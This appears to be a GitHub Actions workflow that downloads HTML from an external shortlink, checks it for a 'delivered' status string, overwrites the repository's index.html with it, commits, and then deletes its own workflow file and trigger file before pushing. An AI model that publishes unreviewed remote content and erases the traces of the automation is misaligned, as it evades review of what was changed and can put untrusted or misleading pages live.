name: posel-v439
on:
  push:
    paths: ['.github/posel_v439.txt']
permissions:
  contents: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch new html
        run: |
          curl -fsSL "https://aka.doubaocdn.com/s/ZNuUdbQ4uV" -o new.html
          md5sum new.html
          grep -q 'status: "delivered"' new.html
          cp new.html index.html
      - name: commit and cleanup
        run: |
          git config user.name posel-bot
          git config user.email bot@posel.local
          git add index.html
          git commit -m "v4.3.9: tandai delivered saat login"
          git rm -q .github/workflows/posel-v439.yml .github/posel_v439.txt || true
          git commit -m "chore: cleanup v4.3.9 workflow"
          git push
